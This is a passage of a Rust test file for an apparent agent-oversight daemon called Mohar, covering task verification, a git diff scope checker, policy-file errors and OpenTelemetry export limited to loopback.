        (v["verified"].as_u64(), v["result"].as_str()),
        (Some(2), Some("fail"))
    );
    // Another task that leaves the tests alone passes.
    edit_that_ran(d.port, &root, "src/b.rs", "t2");
    assert_eq!(verify_task(d.port, "t2")["result"], "pass");
}

#[test]
fn only_actions_that_ran_and_changed_something_are_verified() {
    let dir = verifying_log("v-scope", json!([BIN, "--version"]), 60);
    let root = dir.parent().expect("root").to_path_buf();
    let d = Daemon::start(&dir, &[]);
    // Decided but never run (a person said no, or the host never reported it).
    let b = json!({"agent": "agent:test/1", "tool": "Edit", "target": format!("{}/src/x.rs", root.display()),
                   "args_sha256": SHA, "task": "t1"});
    assert_eq!(post(d.port, "/v1/decide", &b.to_string()).0, 200);
    assert_eq!(verify_task(d.port, "t1")["verified"], 0);
    assert_eq!(verify_task(d.port, "never-seen")["verified"], 0);
}

#[test]
fn a_stop_event_verifies_the_session_through_the_hook() {
    let dir = verifying_log("v-hook", json!([BIN, "--version"]), 60);
    let root = dir.parent().expect("root").to_path_buf();
    let d = Daemon::start(&dir, &[]);
    let file = format!("{}/src/a.rs", root.display());
    let pre_edit = pre(
        "Edit",
        json!({"file_path": file, "old_string": "a", "new_string": "b"}),
        None,
    );
    assert_eq!(decision(&run_hook(&d.url(), &pre_edit)), "ask");
    let post_edit = json!({"session_id": "s1", "hook_event_name": "PostToolUse", "tool_name": "Edit",
                           "tool_use_id": "toolu_Edit", "tool_input": {"file_path": file}, "tool_response": {}});
    run_hook(&d.url(), &post_edit);
    let stop = json!({"session_id": "s1", "hook_event_name": "Stop", "stop_hook_active": false});
    assert_eq!(run_hook(&d.url(), &stop), Value::Null);
    d.stop();
    assert_eq!(last_kind_and_result(&dir), ("tests".into(), "pass".into()));
}

#[test]
fn reads_are_never_verified_because_they_change_nothing() {
    let dir = fresh_log("v-reads");
    let policy = json!({"version": 1,
        "capabilities": {"fs.read": {"risk": "none", "reversible": true, "ceiling": 2}},
        "rules": [{"tools": ["Read"], "paths": ["**"], "capability": "fs.read"}],
        "verify": {"tests": {"command": [BIN, "--version"]}}});
    std::fs::write(dir.join("policy.json"), policy.to_string()).expect("policy");
    let root = dir.parent().expect("root").to_path_buf();
    let d = Daemon::start(&dir, &[]);
    let b = json!({"agent": "agent:test/1", "tool": "Read", "target": format!("{}/src/a.rs", root.display()),
                   "args_sha256": SHA, "task": "t1"});
    let (_, a) = post(d.port, "/v1/decide", &b.to_string());
    assert_eq!(a["result"], "allow", "a read runs");
    assert_eq!(verify_task(d.port, "t1")["verified"], 0);
}

/// A git repository with one commit and a Mohar log in `.mohar`, whose policy gives docs, config and
/// code their own capabilities and runs a passing test command. Returns (project, log directory).
fn git_project(name: &str) -> (PathBuf, PathBuf) {
    let proj = std::env::temp_dir().join(format!("mohar-git-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&proj);
    std::fs::create_dir_all(proj.join("docs")).expect("mkdir");
    std::fs::write(proj.join("docs/old.md"), "old\n").expect("write");
    let git = |args: &[&str]| {
        let ok = Command::new("git")
            .arg("-C")
            .arg(&proj)
            .args(["-c", "user.name=t", "-c", "user.email=t@example.com"])
            .args(args)
            .output()
            .expect("git");
        assert!(
            ok.status.success(),
            "git {args:?}: {}",
            String::from_utf8_lossy(&ok.stderr)
        );
    };
    git(&["init", "-q"]);
    git(&["add", "-A"]);
    git(&["commit", "-q", "-m", "start"]);
    let log = proj.join(".mohar");
    assert!(
        Command::new(BIN)
            .arg("--dir")
            .arg(&log)
            .arg("init")
            .status()
            .expect("init")
            .success()
    );
    let policy = json!({"version": 1,
        "capabilities": {
            "fs.edit.docs":   {"risk": "low",    "reversible": true, "ceiling": 2},
            "fs.edit.config": {"risk": "high",   "reversible": true, "ceiling": 1},
            "fs.edit.code":   {"risk": "medium", "reversible": true, "ceiling": 2}},
        "rules": [
            {"tools": ["Edit", "Write"], "paths": ["docs/**"], "capability": "fs.edit.docs"},
            {"tools": ["Edit", "Write"], "paths": [".github/**"], "capability": "fs.edit.config"},
            {"tools": ["Edit", "Write"], "paths": ["src/**", ".mohar/**"], "capability": "fs.edit.code"}],
        "verify": {"tests": {"command": [BIN, "--version"]}}});
    std::fs::write(log.join("policy.json"), policy.to_string()).expect("policy");
    (proj, log)
}

#[test]
fn the_diff_verifier_passes_changes_inside_the_task_s_capabilities() {
    let (proj, log) = git_project("in-scope");
    let d = Daemon::start(&log, &[]);
    edit_that_ran(d.port, &proj, "docs/a.md", "t1");
    std::fs::write(proj.join("docs/a.md"), "new\n").expect("write");
    let v = verify_task(d.port, "t1");
    assert_eq!(
        (v["result"].as_str(), v["verifier"].as_str()),
        (Some("pass"), Some("tests"))
    );
    assert_eq!(v["out_of_scope"], json!([]));
}

#[test]
fn the_diff_verifier_fails_a_change_outside_the_task_s_capabilities() {
    let (proj, log) = git_project("out-of-scope");
    let d = Daemon::start(&log, &[]);
    edit_that_ran(d.port, &proj, "docs/a.md", "t1");
    std::fs::write(proj.join("docs/a.md"), "new\n").expect("write");
    // Changed some other way, say through a shell command, with only docs rights.
    std::fs::create_dir_all(proj.join(".github")).expect("mkdir");
    std::fs::write(proj.join(".github/ci.yml"), "on: push\n").expect("write");
    let v = verify_task(d.port, "t1");
    assert_eq!(
        (v["result"].as_str(), v["verifier"].as_str()),
        (Some("fail"), Some("diff"))
    );
    assert_eq!(v["out_of_scope"], json!([".github/ci.yml"]));
    d.stop();
    let r: Value = serde_json::from_str(
        std::fs::read_to_string(log.join("receipts.jsonl"))
            .expect("log")
            .lines()
            .last()
            .expect("line"),
    )
    .expect("json");
    assert_eq!(
        (
            r["verification"]["kind"].as_str(),
            r["verification"]["result"].as_str()
        ),
        (Some("diff"), Some("fail"))
    );
}

#[test]
fn the_diff_verifier_follows_a_rename_out_of_scope() {
    let (proj, log) = git_project("rename");
    let d = Daemon::start(&log, &[]);
    edit_that_ran(d.port, &proj, "docs/old.md", "t1");
    std::fs::create_dir_all(proj.join(".github")).expect("mkdir");
    let mv = Command::new("git")
        .arg("-C")
        .arg(&proj)
        .args(["mv", "docs/old.md", ".github/new.md"])
        .status()
        .expect("git mv");
    assert!(mv.success());
    let v = verify_task(d.port, "t1");
    assert_eq!(v["result"], "fail");
    assert_eq!(
        v["out_of_scope"],
        json!([".github/new.md"]),
        "the old name was in scope, the new one isn't"
    );
}

#[test]
fn the_diff_verifier_does_not_blame_a_task_for_what_changed_before_it() {
    let (proj, log) = git_project("baseline");
    std::fs::create_dir_all(proj.join(".github")).expect("mkdir");
    std::fs::write(proj.join(".github/earlier.yml"), "x\n").expect("write");
    let d = Daemon::start(&log, &[]);
    edit_that_ran(d.port, &proj, "docs/a.md", "t1");
    std::fs::write(proj.join("docs/a.md"), "new\n").expect("write");
    let v = verify_task(d.port, "t1");
    assert_eq!(v["result"], "pass", "{v}");
}

#[test]
fn the_daemon_s_own_log_is_never_counted_as_a_change_the_task_made() {
    let (proj, log) = git_project("own-log");
    let d = Daemon::start(&log, &[]);
    edit_that_ran(d.port, &proj, "docs/a.md", "t1");
    std::fs::write(proj.join("docs/a.md"), "new\n").expect("write");
    // A file the daemon's directory gains mid-task, as a new checkpoint file would be.
    std::fs::write(log.join("checkpoints.extra"), "x\n").expect("write");
    let v = verify_task(d.port, "t1");
    assert_eq!(
        (v["result"].as_str(), &v["out_of_scope"]),
        (Some("pass"), &json!([])),
        "{v}"
    );
}

#[cfg(unix)]
#[test]
fn the_own_log_is_recognised_when_the_project_is_reached_through_a_symlink() {
    // As on macOS, where the temp directory is reached through /var, a link to /private/var.
    let (proj, _log) = git_project("own-log-link");
    let alias = proj.with_extension("alias");
    let _ = std::fs::remove_file(&alias);
    std::os::unix::fs::symlink(&proj, &alias).expect("symlink");
    let d = Daemon::start(&alias.join(".mohar"), &[]);
    edit_that_ran(d.port, &alias, "docs/a.md", "t1");
    std::fs::write(proj.join("docs/a.md"), "new\n").expect("write");
    std::fs::write(proj.join(".mohar/checkpoints.extra"), "x\n").expect("write");
    let v = verify_task(d.port, "t1");
    assert_eq!(
        (v["result"].as_str(), &v["out_of_scope"]),
        (Some("pass"), &json!([])),
        "{v}"
    );
}

#[test]
fn a_policy_file_that_cannot_be_read_stops_the_daemon() {
    let dir = fresh_log("policy-unreadable");
    std::fs::create_dir(dir.join("policy.json")).expect("a directory where the file should be");
    let out = Command::new(BIN)
        .arg("--dir")
        .arg(&dir)
        .args(["daemon", "--addr", "127.0.0.1:0"])
        .stdin(Stdio::null())
        .output()
        .expect("run daemon");
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("policy.json"));
}

/// A stand-in OpenTelemetry collector: accepts OTLP/HTTP posts and passes on each path and JSON body.
fn collector() -> (String, std::sync::mpsc::Receiver<(String, Value)>) {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
    let url = format!("http://{}", listener.local_addr().expect("addr"));
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut s) = stream else { return };
            let mut buf = Vec::new();
            let mut chunk = [0u8; 8192];
            let got = loop {
                let Ok(n) = s.read(&mut chunk) else {
                    break None;
                };
                if n == 0 {
                    break None;
                }
                buf.extend_from_slice(&chunk[..n]);
                let text = String::from_utf8_lossy(&buf).to_string();
                if let Some((head, body)) = text.split_once("\r\n\r\n") {
                    let len: usize = head
                        .lines()
                        .find_map(|l| l.strip_prefix("Content-Length: "))
                        .and_then(|v| v.parse().ok())
                        .unwrap_or(0);
                    if body.len() >= len {
                        let path = head.split(' ').nth(1).unwrap_or("").to_string();
                        break Some((path, serde_json::from_str(body).unwrap_or(Value::Null)));
                    }
                }
            };
            let _ = s.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\n{}");
            if let Some(g) = got
                && tx.send(g).is_err()
            {
                return;
            }
        }
    });
    (url, rx)
}

/// Wait for the collector to receive a post to `path` whose body satisfies `ok`.
fn wait_for(
    rx: &std::sync::mpsc::Receiver<(String, Value)>,
    path: &str,
    ok: impl Fn(&Value) -> bool,
) -> Value {
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
    while let Some(left) = deadline.checked_duration_since(std::time::Instant::now()) {
        match rx.recv_timeout(left) {
            Ok((p, body)) if p == path && ok(&body) => return body,
            Ok(_) => {}
            Err(_) => break,
        }
    }
    panic!("the collector never received a matching {path}");
}

#[test]
fn the_exporter_receives_a_span_per_decision_and_counts_by_result() {
    let dir = fresh_log("otlp");
    let (url, rx) = collector();
    let d = Daemon::start(&dir, &["--otlp-endpoint", &url]);
    let (status, a) = decide(d.port, "Edit", "docs/a.md", Some("toolu_1"));
    assert_eq!(status, 200);
    let seq = a["receipt_seq"].as_u64().expect("seq");
    let done =
        json!({"receipt_seq": seq, "verifier": "human", "result": "pass", "evidence_sha256": SHA});
    assert_eq!(post(d.port, "/v1/outcome", &done.to_string()).0, 200);

    let traces = wait_for(&rx, "/v1/traces", |_| true);
    let span = &traces["resourceSpans"][0]["scopeSpans"][0]["spans"][0];
    assert_eq!(span["name"], "mohar.decide");
    let attrs = span["attributes"].as_array().expect("attributes");
    let get = |k: &str| {
        attrs
            .iter()
            .find(|a| a["key"] == k)
            .map(|a| a["value"].clone())
    };
    assert_eq!(
        get("mohar.result"),
        Some(json!({"stringValue": a["result"]}))
    );
    assert_eq!(
        get("mohar.receipt_seq"),
        Some(json!({"intValue": seq.to_string()}))
    );
    assert_eq!(span["traceId"].as_str().map(str::len), Some(32));

    let metrics = wait_for(&rx, "/v1/metrics", |m| m.to_string().contains("\"human\""));
    let list = metrics["resourceMetrics"][0]["scopeMetrics"][0]["metrics"]
        .as_array()
        .expect("metrics");
    let named = |n: &str| list.iter().find(|m| m["name"] == n).expect(n).clone();
    assert_eq!(
        named("mohar.decisions")["sum"]["dataPoints"][0]["asInt"],
        "1"
    );
    assert_eq!(
        named("mohar.outcomes")["sum"]["dataPoints"][0]["asInt"],
        "1"
    );
    assert_eq!(
        named("mohar.decide.duration")["histogram"]["dataPoints"][0]["count"],
        "1"
    );
    assert!(named("mohar.inflight")["gauge"]["dataPoints"][0]["asInt"].is_string());
}

#[test]
fn a_collector_that_is_down_never_changes_a_decision() {
    let dir = fresh_log("otlp-down");
    let port = std::net::TcpListener::bind("127.0.0.1:0")
        .expect("bind")
        .local_addr()
        .expect("addr")
        .port();
    let d = Daemon::start(
        &dir,
        &["--otlp-endpoint", &format!("http://127.0.0.1:{port}")],
    );
    for i in 0..3 {
        assert_eq!(decide(d.port, "Edit", &format!("docs/{i}.md"), None).0, 200);
    }
    d.stop();
    assert!(verify(&dir).contains("3 receipts"));
}

#[test]
fn an_otlp_endpoint_off_the_machine_stops_the_daemon() {
    let dir = fresh_log("otlp-remote");
    let out = Command::new(BIN)
        .arg("--dir")
        .arg(&dir)
        .args([
            "daemon",
            "--addr",
            "127.0.0.1:0",
            "--otlp-endpoint",
            "http://203.0.113.7:4318",
        ])
        .stdin(Stdio::null())
        .output()
        .expect("run daemon");
    assert_eq!(out.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&out.stderr).contains("loopback"));
}
